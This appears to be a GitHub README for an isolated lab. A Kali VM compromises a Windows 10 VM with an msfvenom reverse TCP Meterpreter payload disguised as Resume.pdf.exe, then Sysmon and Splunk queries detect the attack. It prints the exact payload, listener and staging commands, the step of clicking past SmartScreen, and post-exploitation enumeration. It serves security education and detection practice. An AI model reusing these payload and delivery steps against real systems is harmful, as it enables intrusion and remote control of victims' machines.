# Endpoint-Reverse-Shell-Detection-Lab-Sysmon-Splunk-
Metasploit Reverse Shell Attack & Splunk Detection Lab
Description
Simulated a full end-to-end cyberattack in a controlled virtual lab environment using Kali Linux as the attacker and Windows 10 as the victim. A malicious reverse shell payload was crafted with msfvenom, disguised as Resume.pdf.exe, and delivered to the victim via a Python HTTP server — simulating a real-world phishing/social engineering attack. A Meterpreter reverse TCP shell was established through Metasploit Framework, granting full remote access to the target machine. Splunk Enterprise with Sysmon was configured on the Windows victim to ingest and monitor telemetry, allowing SOC-style analysis and detection of the attack activity.
Key Skills Demonstrated

Offensive security with Metasploit Framework & msfvenom
Payload crafting and social engineering delivery (file disguise technique)
Reverse shell exploitation (windows/x64/meterpreter/reverse_tcp)
Post-exploitation enumeration (net user, net localgroup, ipconfig, shell)
Network reconnaissance with Nmap
Python HTTP server for payload staging and delivery
Splunk Enterprise installation, index creation & configuration
inputs.conf configuration for Windows Event Log & Sysmon ingestion
Sysmon log analysis and threat hunting with SPL queries
SOC blue team detection using Splunk Search & Reporting

Prerequisites

Kali Linux VM (attacker) — IP: 192.168.20.11
Windows 10 VM (victim) — IP: 192.168.20.10
Both VMs connected on the same internal/host-only network
Metasploit Framework installed on Kali Linux
Splunk Enterprise installed on the Windows 10 VM
Sysmon installed and configured on the Windows 10 VM

Walk-through (step-by-step)

Phase 1 – Reconnaissance

Scan the target with Nmap

From Kali Linux, perform an Nmap scan against the Windows victim to discover open ports.
Command: nmap 192.168.20.10 -Pn
Result: Port 3389/tcp (RDP — ms-wbt-server) is open, confirming the host is alive and reachable.<br/>
<img width="1366" height="191" alt="Screenshot (129)" src="https://github.com/user-attachments/assets/1a034f48-0d80-4703-9120-4932a96205f2" />




<br />

Phase 2 – Payload Crafting

Review msfvenom options and available payloads

Run msfvenom --help to review payload crafting syntax, then msfvenom -l payloads to browse available Windows payloads.
The payload windows/x64/meterpreter/reverse_tcp was selected — a staged Meterpreter shell that calls back to the attacker.<br/>
<img width="1366" height="619" alt="Screenshot (131)" src="https://github.com/user-attachments/assets/1b7b50f9-510b-48b7-a98a-9b1288f47f88" />




<br />

Identify the correct payload

From the payload list, locate and confirm windows/x64/meterpreter/reverse_tcp — highlighted as the chosen staged reverse TCP Meterpreter payload.<br/>
<img width="1366" height="509" alt="Screenshot (132)" src="https://github.com/user-attachments/assets/bff20610-b855-4a2b-8410-54000e9af87f" />




<br />

Generate the malicious payload

Craft the payload disguised as a PDF file to trick the victim into executing it.
Command:



     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe

Output: Resume.pdf.exe saved successfully (238,080 bytes).<br/>
<img width="1366" height="134" alt="Screenshot (134)" src="https://github.com/user-attachments/assets/42d09ac4-53ef-4b34-9cbf-6f98f13de9b3" />


<br />

Phase 3 – Listener Setup

Launch Metasploit Framework

Open a terminal on Kali Linux and run msfconsole.
Navigate to exploit/multi/handler to set up the reverse shell listener.<br/>
<img width="1366" height="607" alt="Screenshot (138)" src="https://github.com/user-attachments/assets/b2794475-8f91-4098-9080-f0df10cf72b3" />





<br />

Configure the multi/handler — set payload

Inside Metasploit, run:



     use exploit/multi/handler
     set payload windows/x64/meterpreter/reverse_tcp
     show options

Confirm the payload is set correctly.<br/>
<img width="1366" height="371" alt="Screenshot (141)" src="https://github.com/user-attachments/assets/9b3f14af-0c9e-439c-b9f8-579d4c650777" />



<br />

Set LHOST and verify options

Set the attacker's IP as the listener address:



     set lhost 192.168.20.11
     show options

Confirm: LHOST = 192.168.20.11, LPORT = 4444.<br/>
<img width="1017" height="73" alt="Screenshot (143)" src="https://github.com/user-attachments/assets/8eb0c488-fe5a-485a-89dd-0040e52f19fe" />



<br />

Start the listener

Run the handler: run
Output: [*] Started reverse TCP handler on 192.168.20.11:4444<br/>




<br />

Phase 4 – Payload Delivery

Host the payload on a Python HTTP server

On Kali Linux Desktop, confirm Resume.pdf.exe is present with ls, then start a web server:



     python3 -m http.server 9999

Output: Serving HTTP on 0.0.0.0 port 9999<br/>
<img width="1366" height="110" alt="Screenshot (148)" src="https://github.com/user-attachments/assets/ff1357d4-e673-45e6-b4fc-7c454d862eb2" />



<br />

Download the payload on the victim machine

On the Windows 10 VM, open Microsoft Edge (InPrivate) and navigate to 192.168.20.11:9999.
The directory listing shows Resume.pdf.exe — click to download. (Make sure Microsoft Defender is off on Windows 10 VM.)<br/>
<img width="1366" height="605" alt="Screenshot (151)" src="https://github.com/user-attachments/assets/321f841d-2f09-4eef-9162-45d5e1e582db" />




<br />

Execute the payload — bypass SmartScreen

Open the downloaded file. Windows SmartScreen warns the publisher is unknown.
Click Run to proceed, simulating a victim who ignores the security warning.<br/>
<img width="1366" height="616" alt="Screenshot (153)" src="https://github.com/user-attachments/assets/3bcb1881-b293-4fdc-a10a-4d8be37412d9" />





<br />

Phase 5 – Exploitation & Post-Exploitation

Meterpreter session established — drop into shell

Back on Kali, the Meterpreter session opens automatically once the victim executes the payload.
Type shell to obtain a native Windows command prompt on the victim.
Confirmation: C:\Users\admin\Downloads> returned — full remote code execution achieved.<br/>
<img width="1366" height="624" alt="Screenshot (157)" src="https://github.com/user-attachments/assets/fb7ca8b9-cf78-4bc1-b3bc-2b2ff25a45cf" />






<br />

Enumerate local users

Command: net user
Result: Accounts on \\DESKTOP-LOSP218 revealed — admin, Administrator, DefaultAccount, Guest, WDAGUtilityAccount.<br/>
<img width="1366" height="156" alt="Screenshot (158)" src="https://github.com/user-attachments/assets/0406ad22-37b8-4f16-953c-08318b75d25e" />




<br />

Enumerate local groups

Command: net localgroup
Result: All local security groups listed, including Administrators, Remote Desktop Users, Guests, Hyper-V Administrators, and more.<br/>
<img width="1366" height="441" alt="Screenshot (159)" src="https://github.com/user-attachments/assets/31c66219-5551-40f0-9087-f7088b4d2117" />





<br />

Gather network configuration

Command: ipconfig
Result: Victim IPv4 address confirmed as 192.168.20.10, Subnet Mask 255.255.255.0.<br/>
<img width="1366" height="237" alt="Screenshot (160)" src="https://github.com/user-attachments/assets/3ce3afae-9b26-40cc-acc6-8338656bb582" />





<br />

Phase 6 – Splunk Configuration & Log Ingestion

Verify Splunk local config folder

Navigate to C:\Program Files\Splunk\etc\system\local.
Confirm existing config files are present: authentication.conf, server.conf, web.conf, etc.<br/>
<img width="981" height="598" alt="Screenshot (161)" src="https://github.com/user-attachments/assets/a2660d54-175b-4327-97c9-8eb625305438" />





<br />

Copy inputs.conf from Splunk defaults

Navigate to C:\Program Files\Splunk\etc\system\default.
Right-click inputs.conf → drag → Copy here into the local folder.<br/>
<img width="975" height="596" alt="Screenshot (162)" src="https://github.com/user-attachments/assets/504371f3-749d-4dfd-8012-8bda3f430864" />




<br />

Open and edit inputs.conf

In the local folder, right-click inputs.conf → Open with → Notepad.
Add the following log source stanzas to forward events to the endpoint index:



      [WinEventLog://Microsoft-Windows-Sysmon/Operational]
      index = endpoint
      disabled = false
      renderXml = true
      source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

      [WinEventLog://Microsoft-Windows-Windows Defender/Operational]
      index = endpoint
      disabled = false

      [WinEventLog://Microsoft-Windows-PowerShell/Operational]
      index = endpoint
      disabled = false

      [WinEventLog://Application]
      index = endpoint
      disabled = false

      [WinEventLog://Security]
      index = endpoint
      disabled = false

      [WinEventLog://System]
      index = endpoint
      disabled = false
<br/>
<img width="1366" height="619" alt="Screenshot (166)" src="https://github.com/user-attachments/assets/a04b1e9c-c5a9-4e05-a848-c9afe094c6bd" />

<br />

19. **Confirm `inputs.conf` saved in local folder**
    - Right-click `inputs.conf` in the local folder to verify it is present and has been updated.<br/>
<img width="979" height="595" alt="Screenshot (163)" src="https://github.com/user-attachments/assets/4e379fbe-bc3b-446f-a40c-075107663776" />

<br />

20. **Verify the `endpoint` index in Splunk**
    - In Splunk, go to **Settings** → **Indexes** (via the Apps menu).
    - Confirm the `endpoint` index is listed as **Active**.<br/>
<img width="1366" height="537" alt="Screenshot (168)" src="https://github.com/user-attachments/assets/f4ed602a-c813-4c7c-bd21-947f711b80b7" />

<br />

---

### Phase 7 – Detection & Threat Hunting in Splunk

21. **Search the endpoint index — verify data ingestion**
    - In Splunk Search & Reporting, type: `index="endpoint"` and run.
    - Result: **1,458 events** returned — Windows and Sysmon logs are successfully flowing into Splunk.<br/>
<img width="1366" height="534" alt="Screenshot (170)" src="https://github.com/user-attachments/assets/1f7113f5-bd72-4885-8d0a-37312ea3dd1d" />

<br />

22. **Search for the attacker's IP address**
    - Run: `index=endpoint 192.168.20.11`
    - Result: **46 events** containing the attacker's IP — a key Indicator of Compromise (IOC).<br/>
<img width="1366" height="539" alt="Screenshot (171)" src="https://github.com/user-attachments/assets/a4711f76-35c7-4732-8b74-a96441dc534a" />

<br />

23. **Analyse `dest_port` field — confirm C2 port 4444**
    - Click on the `dest_port` field in the sidebar.
    - Result: Port **4444** (Meterpreter C2 callback) is detected alongside port 3389, confirming the active reverse shell connection from victim to attacker.<br/>
<img width="1366" height="540" alt="Screenshot (172)" src="https://github.com/user-attachments/assets/862b9c7c-ad57-472d-9406-64eb92c34dc8" />

<br />

24. **Search for the malicious file directly**
    - Run: `index=endpoint Resume.pdf.exe`
    - Result: **16 events** all linked to the malicious payload. The timeline spike confirms the exact moment of execution.<br/>
<img width="1366" height="537" alt="Screenshot (173)" src="https://github.com/user-attachments/assets/d821a8cf-5e7c-4e49-9f71-dec53764f3ff" />

<br />

25. **Inspect EventCode values**
    - Click the `EventCode` field while the `Resume.pdf.exe` search is active.
    - Result: **EventCode 15** (Sysmon — FileCreateStreamHash) dominates at 37.5%, flagging that the file was downloaded via the browser and contains an Alternate Data Stream identifier (Zone.Identifier).<br/>
<img width="1366" height="544" alt="Screenshot (174)" src="https://github.com/user-attachments/assets/384f22e8-615a-4041-80ff-d2bd00264b18" />

<br />

26. **Examine full Sysmon EventCode 15 event**
    - Filter: `index=endpoint Resume.pdf.exe EventCode=15`
    - Expand the event. Key fields confirmed:
      - `file_name`: `Resume.pdf.exe`
      - `file_path`: `C:\Users\kow\Downloads\Resume.pdf.exe`
      - `http_referrer`: `http://192.168.20.11:9999/`
      - `process_name`: `msedge.exe`
      - `EventDescription`: `FileCreateStreamHash`
      - `technique_id`: **T1189** — Drive-by Compromise<br/>
<img width="1366" height="540" alt="Screenshot (175)" src="https://github.com/user-attachments/assets/3ba3b152-00ab-4d1a-8375-ac0069eae5da" />

<br />

27. **Review full IOC enrichment fields**
    - Scrolling further through the event reveals full file hashes (SHA1, SHA256, MD5, IMPHASH), `HostUrl` confirming the file was served from `192.168.20.11:9999/Resume.pdf.exe`, and `ZoneId=3` (Internet Zone — file came from an untrusted external source).<br/>
<img width="1366" height="534" alt="Screenshot (176)" src="https://github.com/user-attachments/assets/972b73a3-11b9-44a3-9986-749ea75413f1" />

<br />

28. **Trace full process chain with process GUID**
    - Copy the `process_guid` value from the event and search: `index=endpoint {cd03015e-cbbc-69a5-c208-000000000700}`
    - Result: **6 events** returned, tracing all Sysmon activity linked back to the malicious process from execution to post-exploitation commands.<br/>
<img width="1366" height="535" alt="Screenshot (179)" src="https://github.com/user-attachments/assets/cb32ed65-1280-4f0b-88cb-9bc87d8d5567" />

<br />

29. **View post-exploitation commands in Statistics view**
    - Using the process GUID search with a table view (`ParentImage`, `Image`, `CommandLine`), the full attacker command sequence is visible:
      - `Resume.pdf.exe` → spawned `cmd.exe`
      - `cmd.exe` → `net user`
      - `cmd.exe` → `net localgroup`
      - `cmd.exe` → `ipconfig`
    - All attacker enumeration commands captured and attributed to the malicious parent process.<br/>
<img width="1536" height="930" alt="Screenshot (180)" src="https://github.com/user-attachments/assets/60dfb5c4-e8dc-44f6-b131-47b57991613c" />

<br />

---

## Splunk Queries Used

| Query | Purpose |
|---|---|
| `index="endpoint"` | Confirm data ingestion — baseline check |
| `index=endpoint 192.168.20.11` | Find all events referencing the attacker IP |
| `index=endpoint Resume.pdf.exe` | Isolate all events linked to the malicious payload |
| `index=endpoint Resume.pdf.exe EventCode=15` | Filter Sysmon FileCreateStreamHash events |
| `index=endpoint {process_guid}` | Trace the full process chain from initial execution |

## Attack Summary

| Phase | Action | Tool |
|---|---|---|
| Reconnaissance | Port scan of Windows target | Nmap |
| Payload Crafting | Generated reverse TCP EXE disguised as PDF | msfvenom |
| Delivery | Hosted payload via HTTP; victim downloaded via Edge | Python http.server |
| Execution | Victim ran payload — SmartScreen bypassed | Windows 10 / Edge |
| Exploitation | Caught reverse shell — full remote access gained | Metasploit multi/handler |
| Post-Exploitation | Enumerated users, groups, network config | Meterpreter / Windows CMD |
| Detection | Ingested Sysmon + Windows logs; hunted IOCs via SPL | Splunk Enterprise + Sysmon |

## Outcome & Summary
A fully functional Meterpreter reverse shell was established from a Windows 10 victim machine back to a Kali Linux attacker using `windows/x64/meterpreter/reverse_tcp`. The payload was disguised as a legitimate PDF resume and staged on a Python HTTP server, simulating a drive-by download attack (MITRE ATT&CK **T1189**). Post-exploitation enumeration confirmed the attacker had full access — enumerating local user accounts, security groups, and network details through the Meterpreter shell.

On the defensive side, Splunk Enterprise with Sysmon and Windows Event Log ingestion via `inputs.conf` successfully captured the full attack chain — from the initial file download (Sysmon EventCode 15, `FileCreateStreamHash`, `ZoneId=3`) to the reverse shell C2 callback on port 4444, to every post-exploitation command (`net user`, `net localgroup`, `ipconfig`) — all traceable through the malicious parent process `Resume.pdf.exe` using Splunk's SPL.

> ⚠️ **Disclaimer:** This project was conducted entirely in an isolated virtual lab environment for educational purposes only. All techniques demonstrated are for cybersecurity learning and should never be applied to systems without explicit written authorization.
